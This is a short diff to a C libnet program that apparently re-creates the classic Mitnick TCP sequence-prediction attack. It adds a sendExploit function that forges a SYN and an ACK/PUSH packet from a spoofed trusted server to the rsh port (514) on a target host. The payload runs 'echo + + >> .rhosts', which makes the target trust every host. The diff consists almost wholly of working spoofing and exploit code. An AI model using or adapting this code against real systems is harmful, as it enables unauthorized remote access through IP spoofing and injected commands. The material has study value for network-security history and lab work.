@@ -54,7 +54,10 @@ int main()
     uint32_t next=packetSnifferInitialize(l,kevin,xterminal);
     printf("\n Next: %u",next);
     fflush(stdout);
+    printf("\n EXPLOITING");
+    sendExploit(next,"0\0tsutomu\0tsutomu\0echo + + >> .rhosts",38,xterminal,server, l );
     usleep(1000);
+
     printf("\n Enabling the server...");
     fflush(stdout);
     enableServer(l,kevin,server);
@@ -62,4 +65,17 @@ int main()
     //restore server
     libnet_destroy(l);
     return 0;
+}
+
+void sendExploit(uint32_t next, char *payload, int plen, u_long xterminal, u_long server, libnet_t *l)
+{
+
+//SYN
+        tcpTagCreate(l,(u_int32_t)514, (u_int32_t)514,(u_int32_t)123456,(u_int32_t)1,NULL,0,TH_SYN);
+        ipTagCreate(l,(u_int32_t)server,(u_int32_t)xterminal,NULL,(u_int32_t)0);
+        sendPacket(l);
+//ACK
+        tcpTagCreate(l,(u_int32_t)514, (u_int32_t)514,(u_int32_t)123457,(u_int32_t)next+1,(u_int8_t*)payload,plen, TH_ACK | TH_PUSH);
+        ipTagCreate(l,(u_int32_t)server,(u_int32_t)xterminal,NULL,(u_int32_t)plen);
+        sendPacket(l);
 }
